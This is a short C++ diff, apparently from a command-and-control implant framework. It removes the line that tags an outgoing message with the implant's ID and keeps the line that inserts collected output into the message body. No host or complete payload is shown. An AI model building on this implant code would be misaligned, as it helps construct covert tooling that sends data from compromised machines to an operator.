@@ -122,7 +122,6 @@ namespace [[ raw_profile_namespace ]] {
 
         // 2. Build Wire Payload
         std::string body = "[[ post_body ]]";
-        replace_token(body, "<CLIENT_ID>", implant_uuid);
         replace_token(body, "<OUTPUT>", payload);
 
         std::vector<uint8_t> wire_payload(body.begin(), body.end());
